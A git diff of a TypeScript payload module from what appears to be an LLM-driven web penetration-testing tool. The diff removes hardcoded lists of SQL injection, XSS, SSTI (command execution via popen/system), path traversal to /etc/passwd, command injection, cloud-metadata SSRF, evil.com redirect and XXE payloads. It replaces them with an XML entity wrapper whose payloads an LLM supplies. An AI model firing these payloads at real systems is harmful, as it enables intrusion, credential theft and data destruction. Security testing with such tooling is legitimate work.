@@ -1,183 +1,24 @@
 // src/primitives/payload.ts
 //
 // Payload-crafting primitives: craftPayload, craftBypass, craftXmlEntity, craftMultipart.
-// These produce the actual strings/bytes that the Composer will inject into a request.
+// craftPayload is now a NO-OP — the LLM crafts payloads inline in injectInContext.args.payload.
+// craftXmlEntity and craftMultipart are kept as format-only wrappers with zero generation logic.
 
-import type { InjectionLocation, PayloadType, PrimitiveDefinition, PrimitiveResult } from './types';
-
-const SQLI_PAYLOADS: Record<string, string[]> = {
-  url: [
-    `' OR 1=1 --`,
-    `' OR '1'='1`,
-    `' UNION SELECT NULL--`,
-    `' UNION SELECT username, password FROM users--`,
-    `1' ORDER BY 1--`,
-    `1' AND SLEEP(3)--`,
-    `'; WAITFOR DELAY '0:0:3'--`,
-    `admin'--`,
-  ],
-  body: [
-    `' OR 1=1 --`,
-    `'; DROP TABLE users;--`,
-    `' UNION SELECT NULL,version()--`,
-  ],
-  header: [`' OR 1=1 --`],
-  cookie: [`' OR 1=1 --`],
-  path: [`../' OR 1=1 --`],
-  filename: [`' OR 1=1 --.txt`],
-  'xml-entity': [],
-};
-
-const XSS_PAYLOADS: Record<string, string[]> = {
-  html: [
-    `<script>alert(1)</script>`,
-    `<img src=x onerror=alert(1)>`,
-    `<svg onload=alert(1)>`,
-    `<details open ontoggle=alert(1)>`,
-    `<iframe srcdoc="<script>alert(1)</script>">`,
-    `"><svg onload=alert(1)>`,
-    `javascript:alert(1)`,
-  ],
-  attr: [
-    `" onmouseover="alert(1)`,
-    `' onfocus='alert(1)`,
-    `" autofocus onfocus="alert(1)`,
-  ],
-  js: [
-    `';alert(1);//`,
-    `\\';alert(1);//`,
-    `</script><script>alert(1)</script>`,
-  ],
-  url: [
-    `javascript:alert(1)`,
-    `data:text/html,<script>alert(1)</script>`,
-  ],
-  css: [
-    `}</style><script>alert(1)</script>`,
-    `expression(alert(1))`,
-  ],
-};
-
-const SSTI_PAYLOADS: Record<string, string[]> = {
-  generic: [
-    `{{7*7}}`,
-    `\${7*7}`,
-    `<%= 7*7 %>`,
-    `#{7*7}`,
-    `\${'{{'}.toString()}`,
-  ],
-  jinja: [
-    `{{config.items()}}`,
-    `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,
-  ],
-  twig: [`{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}`],
-  freemarker: [`<#assign x="freemarker.template.utility.Execute"?new()> \${x("id")}`],
-  erb: [`<%= system('id') %>`],
-  velocity: [`#set($x=1+1)$x`],
-};
-
-const PATH_TRAVERSAL = [
-  `../../../etc/passwd`,
-  `..%2F..%2F..%2Fetc%2Fpasswd`,
-  `....//....//....//etc/passwd`,
-  `..\\..\\..\\windows\\win.ini`,
-  `file:///etc/passwd`,
-  `/etc/passwd`,
-];
-
-const CMD_INJECTION = [
-  `; ls -la`,
-  `| cat /etc/passwd`,
-  `$(cat /etc/passwd)`,
-  `; id`,
-  `& whoami`,
-  `\`id\``,
-];
-
-const SSRF_PAYLOADS = [
-  `http://169.254.169.254/latest/meta-data/`,
-  `http://metadata.google.internal/computeMetadata/v1/`,
-  `http://100.100.100.200/latest/meta-data/`,
-  `http://169.254.169.254/metadata/instance?api-version=2021-02-01`,
-  `http://127.0.0.1:6379/`,
-  `http://localhost:9200/_cat/indices`,
-  `http://[::1]/`,
-];
-
-const REDIRECT_PAYLOADS = [
-  `//evil.com`,
-  `https://evil.com`,
-  `/\\evil.com`,
-  `//evil.com/path`,
-  `https://evil.com%0D%0AContent-Type:text/html`,
-  `////evil.com`,
-  `https:evil.com`,
-];
-
-const CSRF_TEST_PARAMS = [
-  'csrf_token',
-  'csrfmiddlewaretoken',
-  '_csrf',
-  'authenticity_token',
-  'token',
-  'xsrf_token',
-];
+import type { PrimitiveDefinition, PrimitiveResult } from './types';
 
 export const craftPayload: PrimitiveDefinition<
-  { type: PayloadType; context?: string; engine?: string; count?: number },
+  { type?: string; context?: string; engine?: string; count?: number },
   string[]
 > = {
   name: 'craftPayload',
-  description: 'Generate attack payloads for a given type and injection context. Returns an array of strings the Composer will inject one-by-one.',
+  description: 'DEPRECATED — the LLM now crafts payloads inline. Returns an empty array. Use injectInContext with a payload argument directly.',
   requiresBrowser: false,
   deterministic: true,
-  execute(args, _ctx): PrimitiveResult<string[]> {
-    const start = Date.now();
-    const limit = args.count ?? 6;
-    let candidates: string[] = [];
-
-    switch (args.type) {
-      case 'sqli': {
-        const ctx = args.context ?? 'url';
-        candidates = SQLI_PAYLOADS[ctx] ?? SQLI_PAYLOADS.url;
-        break;
-      }
-      case 'xss': {
-        const ctx = args.context ?? 'html';
-        candidates = XSS_PAYLOADS[ctx] ?? XSS_PAYLOADS.html;
-        break;
-      }
-      case 'ssti': {
-        const engine = args.engine ?? 'generic';
-        candidates = SSTI_PAYLOADS[engine] ?? SSTI_PAYLOADS.generic;
-        break;
-      }
-      case 'path':
-        candidates = PATH_TRAVERSAL;
-        break;
-      case 'cmd':
-        candidates = CMD_INJECTION;
-        break;
-      case 'ssrf':
-        candidates = SSRF_PAYLOADS;
-        break;
-      case 'csrf':
-        candidates = CSRF_TEST_PARAMS;
-        break;
-      case 'redirect':
-        candidates = REDIRECT_PAYLOADS;
-        break;
-      case 'xxe':
-        candidates = [];
-        break;
-      default:
-        candidates = [];
-    }
-
+  execute(_args, _ctx): PrimitiveResult<string[]> {
     return {
       ok: true,
-      value: candidates.slice(0, limit),
-      durationMs: Date.now() - start,
+      value: [],
+      durationMs: 0,
     };
   },
 };
@@ -249,37 +90,21 @@ function httpParameterPollution(s: string): string {
 }
 
 export const craftXmlEntity: PrimitiveDefinition<
-  { target: 'file' | 'ssrf' | 'rce'; path?: string; host?: string },
+  { payload: string; systemId?: string },
   string
 > = {
   name: 'craftXmlEntity',
-  description: 'Craft an XML external entity payload for XXE attacks. Returns the full XML string ready to POST.',
+  description: 'Format-only: wraps the LLM-provided payload string in XML DOCTYPE + entity structure. payload is the entity value (e.g. file:///etc/passwd, http://oast-host, "id"), systemId is the entity name (default: xxe).',
   requiresBrowser: false,
   deterministic: true,
   execute(args, _ctx): PrimitiveResult<string> {
     const start = Date.now();
-    let entity = '';
-    if (args.target === 'file') {
-      const path = args.path ?? '/etc/passwd';
-      entity = `<?xml version="1.0" encoding="UTF-8"?>
+    const entityName = args.systemId ?? 'xxe';
+    const entity = `<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file://${path}">
+  <!ENTITY ${entityName} SYSTEM "${args.payload}">
 ]>
-<root><data>&xxe;</data></root>`;
-    } else if (args.target === 'ssrf') {
-      const host = args.host ?? 'http://169.254.169.254/latest/meta-data/';
-      entity = `<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "${host}">
-]>
-<root><data>&xxe;</data></root>`;
-    } else {
-      entity = `<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "expect://id">
-]>
-<root><data>&xxe;</data></root>`;
-    }
+<root><data>&${entityName};</data></root>`;
     return {
       ok: true,
       value: entity,
